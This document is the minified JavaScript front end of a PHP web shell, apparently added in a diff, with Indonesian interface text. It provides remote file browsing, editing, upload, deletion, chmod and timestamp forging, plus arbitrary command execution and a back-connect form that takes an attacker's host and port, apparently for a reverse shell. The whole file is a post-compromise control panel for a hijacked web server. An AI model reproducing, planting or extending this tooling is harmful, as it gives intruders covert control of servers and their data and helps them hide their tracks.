+		<script>!function(t){var e='<div class="mb-3 bg-transparent"><?php echo fType('loader','1.5em');?>Tunggu bentar...</div>';let a={bs64ToBit:function(t){let e=atob(t);return Uint8Array.from(e,t=>t.codePointAt(0))},btTobs64:function(t){let e=String.fromCodePoint(...t);return btoa(e)},isWellFormed:function(t){if(void 0!==t)return t.isWellFormed();try{return encodeURIComponent(t),!0}catch(e){return!1}},encode:function(t){return a.isWellFormed(t)?a.btTobs64(new TextEncoder().encode(t)):""},decode:function(t){return a.isWellFormed(t)?new TextDecoder().decode(a.bs64ToBit(t)):""}},n=(e,a)=>{t("#shownotif").html('<div id="liveToast" class="toast hide" role="alert" aria-live="assertive" aria-atomic="true" data-delay="10000"><div class="toast-header"><img src="<?php echo fType('logo');?>" width="20" class="rounded mr-2" alt="icon"/><strong class="mr-auto">'+e+'</strong><button type="button" class="ml-2 mb-1 close" data-dismiss="toast" aria-label="Close"><span aria-hidden="true">&times;</span></button></div><div class="toast-body text-secondary">'+a+"</div></div>"),t(".toast").toast("show")};function o(a,o,i,r){var d=t("#modalshowaksi").find(".modal-body");t.ajax({type:"get",url:"?act=path&dir="+o+"&entry="+i+"&opt="+a,beforeSend:function(){d.html(e)}}).done(function(t){d.html(""),r(t)}).fail(function(t,e,a){n("Error",t.status),d.html("error_code: "+t.status)})}function i(e){for(var a=0;a<e.length;a++)e[a].addEventListener("change",function(e){var a=t("option:selected",this)[0],i=a.value,r=t("#modalshowaksi"),d="",l="",s="",m=a.attributes["data-xtype"],f=a.attributes["data-xname"],u=a.attributes["data-xpath"],c=e.currentTarget;if(i.length>0){switch(r.find(".modal-footer").addClass("d-none").removeClass("d-flex justify-content-center"),i){case"rename":l="Rename "+m.value.toUpperCase()+" /"+f.value,d='<form method="post" action="?act=rename" id="rqrename"><input type="hidden" name="xtype" value="'+m.value+'"/><input type="hidden" name="xpath" value="'+u.value+'"/><div class="form-group row mb-0"><label for="xname" class="col-sm-2 col-form-label">'+("dir"==m.value?"Directory":"File")+'</label><div class="col-sm-10"><div class="input-group mb-3"><input type="text" class="form-control border-success" id="xname" name="xname" value="'+f.value+'" autofocus/><div class="input-group-append"><button class="btn btn-success" type="submit">GO</button></div></div></div></div></form>',s="";break;case"touch":l="Touch "+m.value.toUpperCase()+" /"+f.value,d='<form method="post" action="?act=touch" id="rqtouch"><input type="hidden" name="xtype" value="'+m.value+'"/><input type="hidden" name="xpath" value="'+u.value+'"/><input type="hidden" name="xname" value="'+f.value+'"/><div class="form-group row"><label for="xtime" class="col-sm-2 col-form-label">Datetime</label><div class="col-sm-10"><div class="input-group"><input type="text" class="form-control border-success" id="xtime" name="xtime" value="'+a.attributes["data-xtime"].value+'" autofocus/><div class="input-group-append"><button class="btn btn-success" type="submit">GO</button></div></div></div></div></form>',s=""}"download"==i?window.open("?act=path&dir="+u.value+"&entry="+f.value+"&opt="+i,"_blank"):"del"==i||"zip"==i||"unzip"==i?(r.modal("show"),r.find(".modal-title").html(i+" /"+f.value),r.find(".modal-body").html('<form method="post" action="?act='+i+'" id="rq'+i+'" class="text-center"><input type="hidden" name="xtype" value="'+m.value+'"/><input type="hidden" name="xname" value="'+f.value+'"/><input type="hidden" name="xpath" value="'+u.value+'"/><div class="alert alert-info m-n3 rounded-0">Klik proses utk melanjutkan!!</div>'),r.find(".modal-footer").removeClass("d-none").addClass("d-flex justify-content-center").html('<button class="btn btn-success" type="submit">Proses!</button></form>'),r.on("hidden.bs.modal",function(t){r.find(".modal-title").html("unknown"),r.find(".modal-body").html("null"),r.find(".modal-footer").addClass("d-none").removeClass("d-flex justify-content-center"),c.value=""})):"edit"==i?(r.modal("show"),r.find(".modal-body").addClass("p-0"),r.find(".modal-title").html("Edit "+m.value.toUpperCase()+": /"+f.value),o("view",u.value,f.value,function(t){var e='<form method="post" action="?act=path&dir='+u.value+"&entry="+f.value+'&opt=edit" id="rqeditfile"><textarea name="xdata" class="form-control rounded-0" style="white-space:pre;background:#2b2f34;" rows="30">'+t+"</textarea>";r.find(".modal-body").html(e),r.find(".modal-footer").removeClass("d-none").addClass("d-flex justify-content-center").html('<button class="btn btn-success text-center" type="submit">Simpan</button></form>'),setTimeout(()=>r.find(".modal-body textarea").focus(),300)}),r.on("hidden.bs.modal",function(t){r.find(".modal-title").html("unknown"),r.find(".modal-body").removeClass("p-0").html("null"),r.find(".modal-footer").addClass("d-none").removeClass("d-flex justify-content-center"),c.value=""})):"view"==i?(r.modal("show"),r.find(".modal-title").html("View "+m.value.toUpperCase()+": /"+f.value),o("view",u.value,f.value,function(t){r.find(".modal-body").attr("style","background:#2b2f34;").addClass("rounded-0").html('<pre class="mb-0">'+t+"</pre>"),r.find(".modal-footer").removeClass("d-none").addClass("d-flex justify-content-center").html('<button type="button" class="btn btn-danger text-center" data-dismiss="modal" aria-label="Close">Tutup</button>')}),r.on("hidden.bs.modal",function(t){r.find(".modal-title").html("unknown"),r.find(".modal-body").attr("style","").removeClass("rounded-0").html("null"),r.find(".modal-footer").addClass("d-none").removeClass("d-flex justify-content-center"),c.value=""})):(r.modal("show"),r.find(".modal-title").html(l),r.find(".modal-body").html(d),r.on("hidden.bs.modal",function(t){r.find(".modal-title").html("unknown"),r.find(".modal-body").html("null"),c.value=""}))}else n("Error","Invalid request!")},!1)}function r(o,i){t.ajax({type:"get",url:"?act=path&dir="+o,timeout:5e3,beforeSend:function(){t("#fileman").html(e),t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").hide()}}).done(function(e,n,r){t("#fileman").html(a.decode(e)),t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").show().find('input[name="xpath"]').val(o),t("form#rqcmd, form#rqbc").find('input[name="xpath"]').val(o),t("button#fmanager").attr("data-tempdir",o),i(e)}).fail(function(e,a,i){t("#fileman").html(a+", response code: "+e.status),t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").hide(),t("form#rqcmd, form#rqbc").find('input[name="xpath"]').val(o),t("button#fmanager").attr("data-tempdir",o),n("Error",a+", response code: "+e.status)})}t(document).on("click","a#chdrive",function(n){n.preventDefault();var o=t(n.currentTarget).attr("data-path");t.ajax({type:"get",url:"?act=path&dir="+o,beforeSend:function(){t("body").find("#fileman").html(e),t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").hide()},success:function(e){t("body").find("#fileman").html(a.decode(e)),t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").show().find('input[name="xpath"]').val(o),t("form#rqcmd, form#rqbc").find('input[name="xpath"]').val(o)}}).done(function(){i(document.querySelectorAll("#showaksi")),t("form#rqcmd, form#rqbc").find('input[name="xpath"]').val(o),t("form#rqcmd").parent().find("#hasilcommand").html("")})}),t(document).on("click","a#chdir",function(e){e.preventDefault();var a=t(e.currentTarget).attr("data-path");t("ol.breadcrumb").addClass("pl-0").css({background:"transparent",padding:"0"}).html('<li class="breadcrumb-item w-100 active">					<form method="post" action="?act=changedir" class="mb-0" id="rqchdir">						<div class="input-group">							<input type="text" name="xpath" class="form-control form-control-sm border-success" value="'+a+'" autofocus></input>							<div class="input-group-append">								<button class="btn btn-success" type="submit">Go</button>							</div>						</div>					</form></li>')}),t("button#fmanager").on("click",function(n){n.preventDefault();var o=t(n.currentTarget).attr("data-tempdir");t.ajax({type:"get",url:"?act=path&dir="+o,beforeSend:function(){t("body").find("#fileman").html(e),t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").hide()},success:function(e){t("body").find("#fileman").html(a.decode(e)),t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").show().find('input[name="xpath"]').val(o),t("form#rqcmd, form#rqbc").find('input[name="xpath"]').val(o)}}).done(function(){i(document.querySelectorAll("#showaksi")),t("form#rqcmd, form#rqbc").find('input[name="xpath"]').val(o),t("form#rqcmd").parents().find("#hasilcommand").html("")})}),t("button#fmanager").trigger("click"),t('button[data-target="#nav-cmd"]').on("shown.bs.tab",function(e){t("#hasilcommand").hide()}),t('button[data-target="#nav-berkas"]').on("shown.bs.tab",function(e){t("#fberkas").show()}),t('button[data-target="#nav-berkas"]').on("hidden.bs.tab",function(e){t("#fberkas").hide()}),t('button[data-target="#nav-info"]').on("hidden.bs.tab",function(e){t("#nav-info").find("#showinfo").html("")}),t('button[data-target="#nav-info"]').on("shown.bs.tab",function(a){t.ajax({type:"get",url:"?act=info",dataType:"json",beforeSend:function(){t("#nav-info").find("#showinfo").html(e)}}).done(function(e){try{var a=JSON.parse(JSON.stringify(e)),n=t.map(a,function(t,e){return[t]});t("#nav-info").find("#showinfo").html('<blockquote class="blockquote px-3 pt-n3 pb-3 bg-success-rgb rounded">'+n.join("")+"</blockquote>")}catch(o){t("#nav-info").find("#showinfo").html("Error: Gagal menganalisa server!")}})}),t("#fileman").length>0&&(t("#fileman").on("click","a#ffmanager, button#ffmanager",function(e){e.stopPropagation(),r(t(this).attr("data-path"),function(){i(document.querySelectorAll("#showaksi"))})}),t("#fileman").on("click","a#fxmanager",function(e){e.stopPropagation(),r(t(this).attr("data-path"),function(){i(document.querySelectorAll("#showaksi"))})})),t("#showchmod").on("show.bs.modal",function(e){var a=t(e.relatedTarget),n=t(this).find(".modal-body"),o=a.attr("data-xtype"),i=a.attr("data-xname"),r=a.attr("data-xpath"),d=a.attr("data-xperm");n.find('input[name="xtype"]').val(o),n.find('input[name="xname"]').val(i),n.find('input[name="xpath"]').val(r),n.find('input[name="xperm"]').val(d).focus(),n.find('input[id="xname"]').val(i),n.find('label[for="xname"]').css("text-transform","capitalize").html("dir"==o?"Directory":"File")}),t.each(["rqdel","rqzip","rqunzip","rqrename","rqtouch","rqchmod","rqreadfile","rqeditfile","rqnewfile","rqbc"],function(o,i){t(document).on("submit","form#"+i,function(o){o.preventDefault();var r=t(this),d=t("#modalshowaksi");if(r.find('button[type="submit"]').prop("disabled",!0),"rqrename"==i||"rqtouch"==i)r.find('input[readonly="readonly"]').prop("readonly",!1);else if("rqeditfile"==i||"rqnewfile"==i)var l=a.encode(r.find('textarea[name="xdata"]').val());else if("rqbc"==i){var s=r.find('input[name="bhost"]').val(),m=r.find('input[name="bport"]').val();if(r.find('input[name="btype"]').val(),t("body").find("#showbc").remove(),s.length<=0||m.length<=0)return n("Opss!","Server dan port gak boleh dikosongin!"),r.find('button[type="submit"]').prop("disabled",!1),!1}else if("rqreadfile"==i){var f=r.find('input[name="xpath"]').val();if(f.length<1)return n("Opss!","Isi dulu nama filenya pak!"),!1;d.modal("show"),d.find(".modal-title").html("View FILE: "+f),r.find('button[type="submit"]').prop("disabled",!1)}t.ajax({type:"post",url:r.attr("action"),data:"rqeditfile"==i||"rqnewfile"==i?{xdata:l}:r.serialize(),beforeSend:function(){t("rqbc"==i?'<div class="row" id="showbc"><div class="col-12 mb-3">'+e+"</div></div>":e).insertAfter(r)}}).done(function(e){r.parent().find("div.bg-transparent").remove(),r.find('button[type="submit"]').prop("disabled",!1),"rqreadfile"==i?(d.find(".modal-body").html('<pre class="pre-scrollable mb-0">'+e+"</pre>"),d.find(".modal-footer").html("")):"rqbc"==i?t("#showbc div").html('<pre class="pre-scrollable mb-0">'+e+"</pre>"):("rqrename"==i||"rqtouch"==i?r.find('input[readonly="readonly"]').prop("readonly",!0):"rqchmod"==i&&t("body").find("#showchmod").modal("hide"),d.modal("hide"),n("Alert",e));var a=t("#fileman").find("a#ffmanager");a[a.length-1].click(function(t){t.stopPropagation()})})})}),t(document).on("submit","form#rqchdir",function(e){e.preventDefault();var a=t(this),o=a.find('input[name="xpath"]').val();o.length<1?n("Opss!","Isi dulu nama direktorinya pak!"):(a.find('button[type="submit"]').prop("disabled",!0),r(o,function(){var t=document.querySelectorAll("#showaksi");t.length>0?i(t):n("Error","Direktori tidak ada/ tidak berisi file apapun!")}),a.find('button[type="submit"]').prop("disabled",!1))}),t(document).on("submit","form#rqmkdir",function(a){a.preventDefault();var o=t(this),i=o.find('input[name="xdir"]').val();if(i.length<1)n("Error","Isi dulu nama direktorinya pak!");else if("file"==o.find(":selected").val()){var r=t("#modalshowaksi"),d=o.find('input[name="xpath"]').val();r.modal("show"),r.find(".modal-title").text("FileName: "+i),r.find(".modal-body").html('<form method="post" action="?act=path&dir='+d+"&entry="+i+'&opt=newfile" id="rqnewfile"><div class="d-block mb-3"><textarea name="xdata" class="form-control" style="white-space:pre;" rows="20" placeholder="tulis seperlunya..." autofocus></textarea></div><center><button class="btn btn-success text-center" type="submit">Simpan</button></center></form>')}else o.find('button[type="submit"]').prop("disabled",!0),t.ajax({type:"post",url:o.attr("action"),data:o.serialize(),beforeSend:function(){t(e).insertAfter(o)},success:function(e){o.next("span").remove(),o.find('button[type="submit"]').prop("disabled",!1),n("Alert",e);var a=t("#fileman").find("a#ffmanager");a[a.length-1].click(function(t){t.stopPropagation()}),o.next("span#notify").fadeTo(3e3,500).slideUp(500,function(){t(this).slideUp(500)})}})}),t('input[type="file"]').on("change",function(){t("form#rqupload").submit()}),t(document).on("submit","form#rqupload",function(e){e.preventDefault();var a=t(this),o=a.find('input[name="xfile[]"]').prop("files");if(o&&o.length<=0||o.size<1)n("Error","File kosong, gak ada isinya!");else{var i=new FormData(this);a.find('button[type="submit"]').prop("disabled",!0),i.append("xfile",o),t.ajax({type:"post",url:a.attr("action"),data:i,dataType:"text",contentType:!1,processData:!1,beforeSend:function(){a.next("span").remove()},success:function(e){a[0].reset(),a.next("span").remove(),a.find('button[type="submit"]').prop("disabled",!1),n("Alert",e);var o=t("#fileman").find("a#ffmanager");o[o.length-1].click(function(t){t.stopPropagation()})}})}}),t(document).on("submit","form#rqcmd",function(n){n.preventDefault();var o=t(this);o.parents().find("#hasilcommand").show(),o.find('button[type="submit"]').prop("disabled",!0),t.ajax({type:"post",url:o.attr("action"),data:o.serialize(),dataType:"json",beforeSend:function(){o.parents().find("#hasilcommand").html(e)},success:function(t){var e=JSON.parse(JSON.stringify(t));o.find('input[name="xpath"]').val(a.decode(e.path)),o.find('button[type="submit"]').prop("disabled",!1),o.parents().find("#hasilcommand").html('<div class="card mb-3"><div class="card-body p-2 font-weight-light">'+a.decode(e.stdout)+"</div></div>")},error:function(t,e,a){o.find('button[type="submit"]').prop("disabled",!1),o.parents().find("#hasilcommand").html('<div class="card mb-3"><div class="card-body p-2 font-weight-light">'+e+": "+a+"</div></div>")}}).done(function(e){var n=JSON.parse(JSON.stringify(e));t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile,form#rqbc").find('input[name="xpath"]').val(a.decode(n.path)),t.each(t("button[data-tempdir]"),function(e,o){t(o).attr("data-tempdir",a.decode(n.path))}),t.each(t("a#fxmanager"),function(e,o){t(o).attr("data-path",a.decode(n.path))})})})}(jQuery);</script>
 	</body>
 </html>
 <?php }?>
